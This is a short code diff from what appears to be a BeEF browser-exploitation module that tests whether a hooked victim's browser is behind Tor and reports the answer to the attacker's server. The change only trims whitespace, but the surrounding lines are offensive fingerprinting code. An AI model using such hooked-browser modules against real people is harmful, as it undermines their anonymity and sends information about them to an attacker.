@@ -29,7 +29,7 @@ beef.execute(function() {
 	document.body.appendChild(img);
 
 	setTimeout(function() {
-		var img = document.getElementById('torimg');	
+		var img = document.getElementById('torimg');
 		if (img.getAttribute("attr") == "error") {
 			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not behind Tor');
 		} else if (img.getAttribute("attr") == "load") {
